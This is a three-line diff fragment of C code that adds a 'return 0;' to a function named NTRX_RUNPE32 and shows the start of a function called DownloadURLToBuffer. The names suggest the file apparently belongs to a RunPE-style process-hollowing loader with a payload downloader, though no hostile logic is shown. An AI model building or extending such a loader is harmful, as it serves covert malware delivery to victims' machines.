@@ -50,6 +50,7 @@ int NTRX_RUNPE32(void* Image)
 			}
 		}
 	}
+	return 0;
 }
 
 LPSTR DownloadURLToBuffer(LPCSTR lpszURL)
